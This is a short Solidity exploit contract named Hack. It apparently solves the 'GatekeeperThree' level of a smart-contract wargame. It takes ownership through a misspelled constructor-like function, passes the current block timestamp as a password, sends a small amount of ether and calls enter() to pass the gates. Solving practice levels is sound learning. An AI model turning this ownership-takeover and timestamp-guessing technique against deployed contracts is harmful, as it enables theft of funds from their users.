// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;
interface IGatekeeperThree{

  function construct0r() external;

  function getAllowance(uint _password) external;

  function createTrick() external;

  function enter() external;
}
contract Hack{
    address public gatekeeper;

    constructor(address addr) payable {
        gatekeeper = addr;
    }

    function attack() public{
        IGatekeeperThree(gatekeeper).construct0r();
        IGatekeeperThree(gatekeeper).createTrick();
        IGatekeeperThree(gatekeeper).getAllowance(block.timestamp);
        payable(address(gatekeeper)).transfer(0.0011 ether); 
        IGatekeeperThree(gatekeeper).enter();
    }
}